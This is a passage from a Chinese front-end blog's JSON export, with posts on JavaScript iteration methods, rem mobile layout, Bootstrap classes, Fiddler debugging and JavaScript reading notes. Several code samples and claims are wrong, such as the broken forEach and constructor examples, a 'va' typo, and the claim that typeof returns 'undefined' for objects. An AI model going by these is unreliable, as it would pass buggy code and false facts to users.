&#123; name: 'Sam' &#125;, &#123; name: 'Pear' &#125;])// &lt;- 'George, Sam, Pear' 六、sort Array.prototype.sort(fn(a,b))需要一个包含两个测试参数的回调函数，并且要产生一下三种返回值之一 如果a在b前，则返回值小于零 如果a和`b是等价的，则返回值等于零 如果a在b后，则返回值大于零 1234567[9,80,3,10,5,6].sort()// &lt;- [10, 3, 5, 6, 80, 9][9,80,3,10,5,6].sort(function (a, b) &#123; return a - b&#125;)// &lt;- [3, 5, 6, 9, 10, 80] 七、forEach 没有返回值，只针对每个元素调用func。 优点：代码简介。 缺点：无法使用break，return等终止循环 value 当前操作的数组元素 当前操作元素的数组索引 array 当前数组的引用 123456let list = [1, 2, 3, 4, 5];list.forEach((d, i) =&gt; &#123; this.push(d * 2);&#125;);console.log(other);// print: [2, 4, 6, 8, 10] 八、for in for-in循环实际是为循环”enumerable“对象而设计的，for in也可以循环数组，但是不推荐这样使用，for–in是用来循环带有字符串key的对象的方法 12345var obj = &#123;a:1, b:2, c:3&#125;;for (var prop in obj) &#123; console.log(\"obj.\" + prop + \" = \" + obj[prop]);&#125;// print: \"obj.a = 1\" \"obj.b = 2\" \"obj.c = 3\" 九、for of for of为ES6提供，具有iterator接口，就可以用for of循环遍历它的成员 for of循环可以使用的范围包括数组、Set和Map结构、某些类似数组的对象（比如arguments对象、DOM NodeList对象）、后文的Generator对象，以及字符串 entries entries() 返回一个遍历器对象，用来遍历[键名, 键值]组成的数组。对于数组，键名就是索引值；对于Set，键名与键值相同。Map结构的iterator接口，默认就是调用entries方法 keys keys() 返回一个遍历器对象，用来遍历所有的键名。 values values()返回一个遍历器对象，用来遍历所有的键值。 这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构 123456789101112131415161718192021222324// 遍历数组let list = [1, 2, 3, 4, 5];for (let e of list) &#123; console.log(e);&#125;// print: 1 2 3 4 5// 遍历对象obj = &#123;a:1, b:2, c:3&#125;;for (let key of Object.keys(obj)) &#123; console.log(key, obj[key]);&#125;// print: a 1 b 2 c 3//说明：对于普通的对象，for...in循环可以遍历键名，for...of循环会报错。//一种解决方法是，使用Object.keys方法将对象的键名生成一个数组，然后遍历这个数组。// entrieslet arr = ['a', 'b', 'c'];for (let pair of arr.entries()) &#123; console.log(pair);&#125;// [0, 'a']// [1, 'b']// [2, 'c']","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"高阶函数","slug":"高阶函数","permalink":"https://ru23.com/tags/高阶函数/"}]},{"title":"移动端布局适配方案","slug":"2017-11-mobile-layout","date":"2017-11-05T07:35:08.000Z","updated":"2018-10-24T03:46:02.217Z","comments":true,"path":"note/c48be4b9.html","link":"","permalink":"https://ru23.com/note/c48be4b9.html","excerpt":"","text":"一、为什么要做适配 为了适应各种移动端设备，完美呈现应有的布局效果 各个移动端设备，分辨率大小不一致，网页想铺满整个屏幕，并在各种分辨下等比缩放 二、适配方案 固定高度，宽度百分比适配-布局非常均匀，适合百分比布局 固定宽度，改变缩放比例适配-什么情况都可以 Rem适配 像素比适配 三、单位 em根据元素自身的字体大小计算,元素自身 16px 1em=16px Rem R -&gt; root 根节点( html ) 根据html的字体大小计算其他元素尺寸 四、百分比适配(常用) 固定高度，宽度百分比适配 根据设置的大小去设置高度，单位可以用px 百分比 auto 常用Flex布局 百分比宽度 以640设计稿为例，在外层容器上设置最大以及最小的宽 12345#wrapper &#123; max-width: 640px; /*设置设计稿的宽度*/ min-width: 300px; margin: 0 auto;&#125; 后面的区块布局都用百分比，具体元素大小用px计算 也就是宽度用百分比，高度用px 高度以及图片不要定死，让它自动撑开 五、Rem适配(常用) 根据屏幕的分辨率动态设置html的文字大小，达到等比缩放的功能 保证html最终算出来的字体大小，不能小于12px 在不同的移动端显示不同的元素比例效果 如果html的font-size:20px的时候，那么此时的1rem = 20px 把设计图的宽度分成多少分之一，根据实际情况 rem做盒子的宽度，viewport缩放 head加入常见的meta属性 12345&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;&lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\"&gt;&lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"&gt;&lt;!--这个是关键--&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0，minimum-scale=1.0\"&gt; 把这段代码加入head中的script预先加载 12345678910111213141516171819202122232425// rem适配用这段代码动态计算html的font-size大小(function(win) &#123; var docEl = win.document.documentElement; var timer = ''; function changeRem() &#123; var width = docEl.getBoundingClientRect().width; if (width &gt; 750) &#123; // 750是设计稿大小 width = 750; &#125; var fontS = width / 10; // 把设备宽度十等分 1rem=10px docEl.style.fontSize = fontS + \"px\"; &#125; win.addEventListener(\"resize\", function() &#123; clearTimeout(timer); timer = setTimeout(changeRem, 30); &#125;, false); win.addEventListener(\"pageshow\", function(e) &#123; if (e.persisted) &#123; //清除缓存 clearTimeout(timer); timer = setTimeout(changeRem, 30); &#125; &#125;, false); changeRem();&#125;)(window) 或者使用淘宝提供的库 https://github.com/amfe/lib-flexible 布局细节 结构用section区块划分更语义化 然后在body设置宽度 1234body &#123; width: 10rem; margin: auto;&#125; 后面的区块都以百分比布局 1234567&lt;div class=\"wrapper\"&gt; &lt;header&gt;&lt;header&gt; &lt;section&gt;&lt;section&gt; &lt;section&gt;&lt;section&gt; &lt;section&gt;&lt;section&gt; &lt;section&gt;&lt;section&gt;&lt;/div&gt; 1234section,header &#123; width: 100%;&#125; 把视觉稿中的 px 转换成 rem 首先，目前日常工作当中，视觉设计师给到前端开发人员手中的视觉稿尺寸一般是基于 640px 、 750px 以及 1125px 宽度为准。甚至为什么？大家应该懂的（考虑Retina屏） 假定设计稿的大小为750，那么我们则将整个图分成10等份来看。&lt;html&gt; 对应的 font-size为75px 123html&#123; font-size: 75px;&#125; 这样一来，对于视觉稿上的元素尺寸换算，只需要原始的 px值 除以 rem基准值 即可 那么，我们现在就可以比对设计稿，比如设计稿中，有一个div元素，宽度，高度都为20px,那么我们这样写即可（可以用 markman标准设计稿的元素大小） 1234div &#123; height: 0.27rem; /*20/75*/ width: 0.27rem;&#125; 动态计算的rem最后会帮我们动态计算元素在不同屏幕下的宽高 对于设计稿上的每个元素的尺寸在设计稿大小已知的时候，我们需要测量出，然后在用测量的宽高除以设计稿750的十分之一也就是75,得到我们想要的rem。而rem是根据屏幕动态变化的，也就达到了适配的效果。也就是同一套设计稿运用在不同的设备上。 比如当我们切换到320设备大小的时候，这时候1rem=32px; div的像素实际是0.27*32=8.64px 0.27是我们在已知设计稿是750的情况下计算出来的，rem用来动态计算而已 对于margin padding line-height width height使用rem计算 如何快速计算 在实际生产当中，如果每一次计算 px 转换 rem ，或许会觉得非常麻烦 CSSREM 是一个CSS的 px 值转 rem 值的Sublime Text3自动完成插件 插件效果 插件使用方法 安装 下载本项目，比如：git clone https://github.com/flashlizi/cssrem 进入packages目录：Sublime Text -&gt; Preferences -&gt; Browse Packages… 复制下载的cssrem目录到刚才的packges目录里。 重启Sublime Text 配置参数 参数配置文件：Sublime Text -&gt; Preferences -&gt; Package Settings -&gt; cssrem px_to_rem - px转rem的单位比例，默认为40【根据设计稿来设置，如设计稿750，我们取十分之一即75】。 max_rem_fraction_length - px转rem的小数部分的最大长度。默认为6。 available_file_types - 启用此插件的文件类型。默认为：[“.css“, “.less“, “.sass“]。 文字适配的解决方案 对于一些标题性的文字，我们依然可以用rem。让他随着屏幕来进行缩放，因为标题性文字一般较大，而较大的文字，点阵对其影响就越小。这样，即使出现奇怪的尺寸，也能够让字体得到很好的渲染。 对于一些正文内容的文字（即站在使用者的角度，你不希望他进行缩放的文字）。我们采用px来进行处理 六、缩放比适配 固定宽度，改变缩放比例适配 设计图的宽度就是网页显示的宽度 改变视口的缩放比例 页面宽度固定死 12345678910111213// 缩放比例适配方案--用这个代码 var width = window.screen.width, fixedW = 320, //设计稿宽度的一半 scale = width / fixedW, // 缩放比例 meta = document.createElement('meta'), metaAttr = &#123; name : 'viewport', content : 'width='+fixedW+', initial-scale='+scale+', maximum-scale='+scale+', user-scalable=0' &#125;; for (var key in metaAttr) &#123; meta[key] = metaAttr[key]; &#125; document.head.appendChild(meta); 七、像素比适配 window.devicePixelRatio 物理像素是手机屏幕分辨率 独立像素 指css像素 屏幕宽度 像素比 = 物理像素 / css宽度 获取设备的像素比 window.devicePixelRatio 八、小结 关于移动端布局方案有很多，rem和百分比运用最多的 相关文章阅读 使用Flexible实现手淘H5页面的终端适配 移动端web开发技巧 移动前端meta标签","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"移动端","slug":"移动端","permalink":"https://ru23.com/tags/移动端/"}]},{"title":"bootstrap常用类小结","slug":"2017-11-bootstrap-summary","date":"2017-11-04T14:55:24.000Z","updated":"2018-10-24T03:46:02.207Z","comments":true,"path":"note/10fd8090.html","link":"","permalink":"https://ru23.com/note/10fd8090.html","excerpt":"","text":"网格选项row :行 col-*-*: 列 第一个*可以为xs[超小]/sm[小型]/md[中型]/lg[大型] 第二个*必须为12以内的[列数] col-*-offset-* :列偏移 第一个*和上面一样,第二个*范围是1到11,表示把该列的左外边距(margin)增加*列 col-*-*-*:列排序 第一个*和上面一样 第二个*可以为push[向右]/pull[向左] 第三个*范围是1到11[列数] 排版 small:内联子标题 lead:引导主体副本 text-*:文本样式 *号可以为left[左对齐]/center[居中对齐]/right[右对齐]/muted[减弱文本]/primary/success/info/warning/danger/justify[自动换行]/nowrap[不换行]/lowercase[小写]/uppercase[大写]/capitalize[首字母大写] list-inline:列表置于同一行 表格 table:基本样式(只有横向分隔线) table-*:表格样式 *可以为striped[添加条纹]/bordered[添加边框]/hover[启用悬停]/condensed[更加紧凑] tr/th/td 有 active/success/info/warning/danger来改变背景颜色 将任意的table放在table-responsive内,实现响应式表格 bootstrap里active/success/info/warning/danger对应的背景颜色 表单创建基本表单(垂直表单)的步骤 向父 &lt;form&gt; 元素添加 role=&quot;form&quot; 把标签和控件放在一个带有.form-group 的 &lt;div&gt; 中。这是获取最佳间距所必需的 向所有的文本元素 &lt;input&gt;、&lt;textarea&gt; 和 &lt;select&gt; 添加.form-control 创建水平表单的步骤 向父 &lt;form&gt; 元素添加 .form-horizontal 把标签和控件放在一个带有 .form-group 的 &lt;div&gt; 中 向标签添加 .control-label 常见的表单控件主要是 input、textarea、checkbox、radio 和 select input: 声明type有text、password、datetime、datetime-local、date、month、time、week、 number、email、url、search、tel 和 color 对父元素添加验证状态has-*:验证样式(*可以为warning/error/success) 按钮 btn:基本样式 btn-*:其他样式 *可以为default/primary/success/info/warning/danger/link[让按钮看起来像个链接]/lg/sm/xs/block[块级按钮,拉伸至父元素100%的宽度]/active/disabled 图片 img-*:图片样式(*可以为rounded[圆角6px]/circle[圆形]/thumbnail[添加内边距和一个灰色的边框]/responsive) 辅助类 Bootstrap里的一些辅助类,除了上面的active/success/info/warning/danger 还有 pull-left/right 元素浮动到左边/右边 center-block 设置元素为 display:block 并居中显示 clearfix 清除浮动 show/hidden 强制显示/隐藏 close 显示关闭按钮 caret 显示下拉式功能 divider 分隔线 字体图标 在 fonts 文件夹内可以找到字体图标，它包含了下列这些文件 1234glyphicons-halflings-regular.eotglyphicons-halflings-regular.svgglyphicons-halflings-regular.ttfglyphicons-halflings-regular.woff 图标参考：http://www.runoob.com/bootstrap/bootstrap-glyphicons.html 下拉菜单 dropdown:下拉菜单 dropdown-menu: 下拉菜单 dropdown-header:下拉菜单区域标题 按钮组 btn-group:里面放置一系列btn btn-toolbar:里面放置几组btn-group btn-group-*:调整按钮组的样式(*可以为xs/sm/lg/vertical) .btn-group 容器添加 .dropup实现按钮上拉菜单 输入框组向 .form-control 添加前缀或后缀元素的步骤 把前缀或后缀元素放在一个带有 .input-group 的 &lt;div&gt;中 接着，在相同的 &lt;div&gt; 内，在 class 为 .input-group-addon 的 &lt;span&gt; 内放置额外的内容 把该 &lt;span&gt; 放置在 &lt;input&gt; 元素的前面或者后面 导航元素 nav nav-tabs :标签式的导航菜单 nav nav-pills: 胶囊式的导航菜单","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"bootstrap","slug":"bootstrap","permalink":"https://ru23.com/tags/bootstrap/"}]},{"title":"使用Fiddler做抓包分析","slug":"2017-11-fiddler","date":"2017-11-04T06:09:43.000Z","updated":"2018-10-24T03:46:02.211Z","comments":true,"path":"note/d422e493.html","link":"","permalink":"https://ru23.com/note/d422e493.html","excerpt":"","text":"一、Fiddler简介 Fiddler是位于客户端和服务器端的HTTP代理，也是目前最常用的http抓包工具之一 。 它能够记录客户端和服务器之间的所有 HTTP请求，可以针对特定的HTTP请求，分析请求数据、设置断点、调试web应用、修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是web调试的利器 客户端的所有请求都要先经过Fiddler，然后转发到相应的服务器，反之，服务器端的所有响应，也都会先经过Fiddler然后发送到客户端 使用了Fiddler之后，web客户端和服务器的请求如下所示 主界面中主要包括四个常用的块 Fiddler的菜单栏，上图绿色部分。包括捕获http请求，停止捕获请求，保存http请求，载入本地session、设置捕获规则等功能。 Fiddler的工具栏,上图红色部分。包括Fiddler针对当前view的操作（暂停，清除session,decode模式、清除缓存等）。 web Session面板，上图黄色区域，主要是Fiddler抓取到的每条http请求（每一条称为一个session）,主要包含了请求的url，协议，状态码，body等信息，详细的字段含义如下图所示 二、HTTP请求图标说明 三、Statistic 关于HTTP请求的性能和其他数据分析 我们可以从中看出一些基本性能数据：如DNS解析的时间消耗是8ms,建立TCP/IP连接的时间消耗是8ms等等信息 四、Inspectors 分为上下两个部分，上半部分是请求头部分，下半部分是响应头部分。对于每一部分，提供了多种不同格式查看每个请求和响应的内容。 JPG 格式使用 ImageView 就可以看到图片 HTML/JS/CSS 使用 TextView可以看到响应的内容。 Raw标签可以查看原始的符合HTTP标准的请求和响应头。 Auth则可以查看授权Proxy-Authorization 和 Authorization的相关信息。 Cookies标签可以看到请求的cookie和响应的set-cookie头信息 五、Composer 老版本的fiddler中叫request-builder.顾名思义，可以构建相应的请求，有两种常用的方式构建请求 Parsed 输入请求的url之后executed即可，也可以修改相应的头信息（如添加常用的accept,host,referrer,cookie，cache-control等头部）后execute`. Raw。使用HTTP头部信息构建http请求。与上类似 六、fiddler过滤会话 问题：每次使用Fiddler,打开一个网站，都能在Fiddler中看到几十个会话，看得眼花缭乱。 期望：只想抓取自己想要的请求 七、Response乱码时的处理方法 问题：有时候我们看到Response中的HTML是乱码的， 这是因为HTML被压缩了， 我们可以通过两种方法去解压缩 方法二：选中工具栏中的”Decode”。 这样会自动解压缩 八、反向代理-AutoResponder 原理：利用fiddler作為反向代理。意思就是将外界的request请求端口修改掉！ 改写返回数据，最实用的功能 用浏览器随意输入一个网址，如http://www.baidu.com/ 选中序号16记录，右击-勾选“Unlock fo Editing”,选择Fiddler右侧reponse块下的TextView，这里修改title,如图： 选择Fiddler右侧reponse块下的TextView，这里修改title,如图： 去掉“Unlock for Editing”，再选择右侧上方的AutoResponder,勾选下方的checkbox选框，并将序号16托到下方，同时，里面会多条记录，如下图： 回到浏览器，刷新页面，如图，标题变为上面改的内容 九、fiddler提供了一个功能，让我们模拟低速网路环境 启用方法如：Rules → Performances → Simulate Modem Speeds 十、直接在fiddler上配置host 点击tools&gt;&gt;hosts,在里面填写自己想要设置的host即可 十一、Fiddler显示请求服务器的ip及系统环境的配置方法 打开Rules——&gt;Customize Rules 找到如下这段代码 12345678910111213static function Main()&#123;var today: Date = new Date();FiddlerObject.StatusText = \" CustomRules.js was loaded at: \" + today;// Uncomment to add a \"Server\" column containing the response \"Server\" header, if present在这一行后面添加如下代码：// 显示服务器web环境FiddlerObject.UI.lvSessions.AddBoundColumn(\"Server\", 50, \"@response.server\");// 显示服务器IP地址FiddlerObject.UI.lvSessions.AddBoundColumn(\"HostIP\", 50, \"x-hostIP\");&#125; 设置后重启fiddler，效果如下 十二、fiddler断点调试 第一种方法：菜单栏 Rules –》 Automatic Breakpoints –》 Before Requests(请求被发送到服务器端之前)；或者 After Responses(响应返回客户端之前)，这种设置对客户机发出的所有请求都进行拦截 十三、配合SwitchySharp插件使用 为fiddler创建一个规则，代理到本地的8888端口（fiddler所用的端口）google设置代理的方法：下载SwitchySharp插件，设置如下： 接着点击保存即可~ 这样在需要的时候可以切换到Fiddler","categories":[{"name":"Tools","slug":"Tools","permalink":"https://ru23.com/categories/Tools/"}],"tags":[{"name":"调试","slug":"调试","permalink":"https://ru23.com/tags/调试/"},{"name":"Fiddler","slug":"Fiddler","permalink":"https://ru23.com/tags/Fiddler/"}]},{"title":"jQuery之思维导图","slug":"2017-10-jq-naotu","date":"2017-10-28T00:20:43.000Z","updated":"2018-10-24T03:46:02.150Z","comments":true,"path":"note/f4c59ce6.html","link":"","permalink":"https://ru23.com/note/f4c59ce6.html","excerpt":"","text":"一、认识JQ 二、JQ选择器 三、JQ中对 属性 、样式、HTML内容、文本内容、值的操作 四、JQ中的事件 五、JQ中的筛选方法 六、JQ中 DOM操作 七、JQ中的动画 八、JQ对象访问 九、位置、尺寸 xmind地址","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"JavaScript启示录阅读笔录","slug":"2017-10-js-read-note","date":"2017-10-24T02:30:13.000Z","updated":"2018-10-24T03:46:02.191Z","comments":true,"path":"note/a87a6818.html","link":"","permalink":"https://ru23.com/note/a87a6818.html","excerpt":"","text":"第一章 JavaScript对象1.1 创建对象 1234567891011//创建copy对象var copy = new Object();//为对象的各种属性赋值copy.living = true;copy.age = 33;copy.gender = 'male';// logs Object &#123;living = true, age = 33, gender = 'male'&#125;console.log(cody); 最重要的是要记住：对象只是属性的容器，每个属性都有一个名称和一个值 1.2 JavaScript构造函数构建并返回对象实例 构造函数的作用是创建多个共享特定特性和行为的对象。 构造函数主要是用于生成对象的模具，这些对象具有默认属性和属性方法 12345678910111213141516//Pserson是一个构造函数 使用new关键字进行实例化 var Person = function(living,age,gender)&#123; //this表示即将创建的新对象 this.living = living; this.age = age; this.gender = gender; this.getGender = function()&#123; return this.gender; &#125; //实例化Person对象 var copy = new Person(true,22,'male'); console.log(copy.constructor);//输入Person函数 &#125; 1.3 JavaScript原生内置对象构造函数 JavaScript包含九个原生对象构造函数，JavaScript使用这些对象来构建JavaScript语言 Number() String() Boolean() Object() Array() Function() Date() RegExp() Error() 使用new关键字实例化每个原生构造函数 123456789var number = new Number(22);var string = new String(\"male\");var boolean = new Boolean(false);var obj = new Object();var arr = new Array(\"foo\",\"dfa\");var func = new Function(\"x\",\"y\",\"return x*y\");var date = new Date();var reg = new RegExp('\\bt[a-z]+\\b');var error = new Error(\"Crap\"); 第二章 对象与属性 2.1 封装复杂对象 Object()、Array()、 Function()对象可以包含其他复杂对象 123456789//使用对象封装，创建对象链var obj1 = &#123; obj1_1: &#123; obj1_1_1: &#123;&#125; &#125;, obj1_2: &#123; obj1_2_1: &#123;&#125; &#125;,&#125;; 123//使用数组封装 创建多维数组链var myArr = [ [ [] ] ]; 12345678910//使用function封装var myFunc = function()&#123; va myfunc = function()&#123; var myfunc = function()&#123; &#125; &#125;&#125; 2.2 用点表示法或中括号表示法获取/设置/更新对象属性 12345678910111213141516171819202122// creating cody Object() objectvar cody = new Object();// setting propertiescody['living'] = true;cody['age'] = 33; cody['gender'] = 'male';cody['getGender'] = function() &#123;return cody.gender;&#125;;// getting propertiesconsole.log( cody['living'], cody['age'], cody['gender'], cody['getGender']() // just slap the function invocation on the end!); // logs 'true 33 male male'// updating properties, very similar to settingcody['living'] = false;cody['age'] = 99; cody['gender'] = 'female';cody['getGender'] = function() &#123;return 'Gender = ' + cody.gender;&#125;; 2.3 删除对象属性 1234var foo = &#123;bar:\"bar\"&#125;;delete foo.bar;console.log(\"bar\" in foo); 2.4 使用hasOwnProperty验证对象属性是否来自原型链 12var obj = &#123;foo:\"value\"&#125;;console.log(obj.hasOwnProperty(\"foo\"));//true 2.5 使用in操作符来检查一个对象是否包含给定属性 12var myObject = &#123;foo: 'value'&#125;;console.log('foo' in myObject); // logs true 2.6 使用for in循环枚举对象属性 12345678910var copy = &#123; age:23, gender:'male'&#125;;for(var key in copy)&#123;//key表示每个属性的名称 if(copy.hasOwnproperty(key))&#123; //避免来自原型链的属性 console.log(key); &#125;&#125; 第三章 Object3.1 Object对象概要 123456var copy = &#123;&#125;;for (key in copy)&#123; if(copy.hasOwnproperty(key))&#123; console.log(key); &#125;&#125; 3.2 Object对象实例属性和方法 实例属性 constructor 实例方法 hasOwnProperty() isPrototypeOf() propertyIsEnumerable() toLocaleString() toString() valueOf() 第四章 Function4.1 Function对象属性和方法 属性 prototype 4.2 function对象实例属性和方法 实例属性 arguments constructor length 实例方法 apply() call() toString() 4.3 this和arguments适用于所有函数 在所有函数的作用域、函数体内，this和arguments值都是可用的 arguments对象是一种类数组对象，它包含所有传递给函数的参数 123456var add = function()&#123; return arguments[0] + arguments[1];&#125;;console.log(add(4,4));//8 12345678910var myObject1 = &#123; name: 'myObject1', myMethod: function()&#123;console.log(this.name);&#125;&#125;;myObject1.myMethod(); // logs 'myObject1'var myObject2 = function()&#123;console.log(this);&#125;; myObject2(); // logs Window 4.4 函数实例的length属性和arguments.length argument对象有一个独特的length属性，它给出的是在调用时发送给函数的参数数量 12345678910var myObject1 = &#123; name: 'myObject1', myMethod: function()&#123;console.log(this.name);&#125;&#125;;myObject1.myMethod(); // logs 'myObject1'var myObject2 = function()&#123;console.log(this);&#125;; myObject2(); // logs Window 通过Function()实例的length属性，实际上可以获得函数所需要的参数总数量 12345var myFunction = function(z, s, d, e, r, m, q) &#123; return myFunction.length;&#125;;console.log(myFunction()); //logs 7 4.5 定义函数语句、表达式、构造函数 123456789101112//函数构造函数var addConstructor = new Function(\"x\",\"y\",\"return x + y\");//函数语句function addStatement(x,y)&#123; return x + y;&#125;//函数表达式var addExp = function()&#123; return x + y;&#125; 4.6 调用函数（函数、方法、构造函数、call、apply） 使用四种不同场景或模式调用函数 作为函数 作为方法 作为构造函数 使用call、apply 1234567891011121314151617181920212223242526272829303132333435// function patternvar myFunction = function()&#123;return 'foo'&#125;;console.log(myFunction()); // log 'foo'// method patternvar myObject = &#123;myFunction: function()&#123;return 'bar';&#125;&#125;console.log(myObject.myFunction()); // log 'bar'// constructor patternvar Cody = function()&#123; this.living = true; this.age = 33; this.gender = 'male'; this.getGender = function() &#123;return this.gender;&#125;;&#125;var cody = new Cody(); // invoke via Cody constructorconsole.log(cody); // logs cody object and properties// apply() and call() patternvar greet = &#123; runGreet: function()&#123; console.log(this.name,arguments[0],arguments[1]); &#125;&#125;var cody = &#123;name:'cody'&#125;;var lisa = &#123;name:'lisa'&#125;;//invoke the runGreet function as if it were inside of the cody objectgreet.runGreet.call(cody,'foo','bar'); //logs cody//invoke the runGreet function as if it were inside of the lisa objectgreet.runGreet.apply(lisa, ['foo','bar']); //logs lisa/* Notice the difference between call() and apply() in how parameters are sent to the function being invoked */ 第六章 this关键字 6.1 this概要及this如何引用 12345678var cody = &#123; living : true, age : 23, gender : 'male', getGender : function() &#123;return cody.gender;&#125;&#125;;console.log(cody.getGender()); // logs 'male' 使用this来重写copy对象 12345678var cody = &#123; living: true, age: 23, gender: 'male', getGender: function() &#123;return this.gender;&#125;&#125;;console.log(cody.getGender()); // logs 'male' this，只要记住，总的来说，this是在函数内部使用，用来引用包含函数的对象，而不是函数本身【使用call、apply、new情况例外】 6.2 如何确定this值 this值会被传递给所有函数，其值基于在运行时调用函数的上下文 6.3 在嵌套函数中用this关键字引用head对象 12345678910111213var myObject = &#123; func1: function() &#123; console.log(this); // logs myObject var func2 = function() &#123; console.log(this) // logs window, and will do so from this point on var func3 = function() &#123; console.log(this); // logs window, as it’s the head object &#125;(); &#125;(); &#125; &#125;myObject.func1(); 总结：当this值的宿主函数被封装在另一个函数的内部或在另一个函数的上下文中被调用时，this值永远是对window对象的引用 6.4 充分利用作用域链研究嵌套函数问题 可以简单在父函数中使用作用域链来保留对this的引用，以便this值不丢失 12345678910111213var myObject = &#123; myProperty: 'I can see the light', myMethod : function()&#123; var that = this; // myMethod 作用域内，保存this引用（也就是myObject） var helperFunction = function() &#123; // 字函数 console.log(that.myProperty); // logs 'I can see the light' console.log(this); // logs window object, if we don't use \"that\" &#125;(); &#125;&#125;myObject.myMethod(); // 调用 myMethod 6.5 使用call()、apply()控制this值 this值通常取决于调用函数的上下文，但我们可以使用apply、call重写this值 123456789101112var myObject = &#123;&#125;;var myFunction = function(param1, param2) &#123; // 调用函数的时候，通过call，将this指向myObject this.foo = param1; this.bar = param2; console.log(this) // logs Object &#123;foo = 'foo', bar = 'bar'&#125;&#125;;myFunction.call(myObject, 'foo', 'bar'); // invoke function, set this value to myObjectconsole.log(myObject) // logs Object &#123;foo = 'foo', bar = 'bar'&#125; 123456789101112var myObject = &#123;&#125;;var myFunction = function(param1, param2) &#123; // 调用函数的时候，通过apply()，将this指向myObject this.foo = param1; this.bar = param2; console.log(this) // logs Object &#123;foo = 'foo', bar = 'bar'&#125;&#125;;myFunction.apply(myObject, ['foo', 'bar']); // invoke function, set this valueconsole.log(myObject) // logs Object &#123;foo = 'foo', bar = 'bar'&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://ru23.com/tags/读书笔记/"}]},{"title":"编写可维护的JavaScript","slug":"2017-10-js-good-style","date":"2017-10-24T02:10:43.000Z","updated":"2018-10-24T03:46:02.152Z","comments":true,"path":"note/22690905.html","link":"","permalink":"https://ru23.com/note/22690905.html","excerpt":"","text":"一、事件处理 1.1 规则1：隔离应用层 好的写法，拆分应用逻辑 1234567891011121314var myApp = &#123; handleClick: function(e)&#123; this.showPopup(e); &#125;, showPopup: function(e)&#123; var popup = document.getElementById(\"popup\"); popup.style.left = e.clientX + \"px\"; popup.style.top = e.clientY + \"px\"; &#125;&#125;;addEventListener(element,\"click\",function(e)&#123; MyApp.handleClick(e);&#125;); 1.2 规则2：不要分发事件对象1234567891011121314151617181920var myApp = &#123; handleClick: function(e)&#123; // 假设事件支持 DOMlevel2 e.preventDefault(); e.stopPropagation(); //传入应用逻辑 this.showPopup(e.clientX,e.clientY); &#125;, showPopup: function(x,y)&#123; var popup = document.getElementById(\"popup\"); popup.style.left = x + \"px\"; popup.style.top = y + \"px\"; &#125;&#125;;addEventListener(element,\"click\",function(e)&#123; MyApp.handleClick(e);&#125;); 二、javascript中的检测方法 2.1 检测原始值 在JavaScript中有五种原始类型：字符串、数字、布尔值、null、undefined。如果你希望一个值是字符串、数字、布尔值或undefined，最佳选择是使用typeof运算符。typeof运算符会返回一个表示值 饿类型的字符串 对于字符串，typeof返回string 对于数字，typeof返回number 对于布尔值，typeof返回boolean 对于undefined，typeof返回undefined 123456789101112131415161718//检测字符串if ( typeof name === \"string\")&#123;&#125;//检测数字if ( typeof count === \"number\")&#123;&#125;//检测布尔值if ( typeof found === \"boolean\" &amp;&amp; found)&#123;&#125;//检测undefinedif ( typeof myApp === \"undefined\")&#123;&#125;//检测nullvar ele = document.getElementById(\"app\");if ( ele !== null)&#123; ele.className = \"found\";&#125; 2.2 检测引用值 有几种内置的引用类型 Object、Array、Date、Error。typeof运算符在判断这些引用类型时显得力不从心，因为所有对象都会返回undefined 1234console.log(typeof &#123;&#125;); //objectconsole.log(typeof []); //objectconsole.log(typeof new Date()); //objectconsole.log(typeof new RegExp()); //object 检测某个引用类型的最好方法使用instanceof运算符。 语法 value instanceof constructor 1234567891011// 检测日期if( value instanceof Date)&#123; console.log(value.getFullYear());&#125;//检测正则表达式if (value instanceof RegExp) &#123; if (value.test(antherValue)) &#123; console.log(\"poetries\"); &#125;&#125; 2.3 检测函数 typeof运算符可以检测函数 1234567function myFunc()&#123;&#125;if (typeof myFunc === \"function\")&#123;&#125; 2.4 检测数组 优雅的方法 123function isArray(value)&#123; return Object.prototype.toString.call(value) === \"[object Array]\";&#125; 2.5 检测属性 判断属性是否存在的最好方法是使用in运算符，in运算符仅仅是判断属性是否存在，而不会去读属性的值 12345678910var object = &#123; count: 0, related: null&#125;;//好的写法if (\"count\" in object)&#123; &#125; 如果只是想检查实例对象的某个属性是否存在，则使用hasOwnProperty()方法。所有继承Object的对象都有这个方法，如果实例存在则返回true。 需要注意的是在IE8以及更早的版本中，DOM对象并非继承Object，因此也不包含这个方法 12345678910//对于所有非DOM对象来说，这是好的做法if(object.hasOwnProperty(\"related\")) &#123;&#125;// 如果你不确定是否为DOM对象 则需要这样写if(\"hasOwnProperty\" in object &amp;&amp; object.hasOwnProperty(\"related\")) &#123;&#125; 在判断实例是否存在时，更倾向使用in运算符，只有在需要判断实例属性时才用hasOwnProperty 三、将配置数据从代码中分离 1234567891011121314//将配置数据抽离出来var config = &#123; MSG_INVALID_VALUE: \"invalid value\", URL_INVALID: \"errors/invalid.php\", CSS_SELECTED: \"selected\"&#125;;function validate(value)&#123; if (!value)&#123; alert(config.MSG_INVALID_VALUE); location.href = config.URL_INVALID; &#125;&#125; 参考 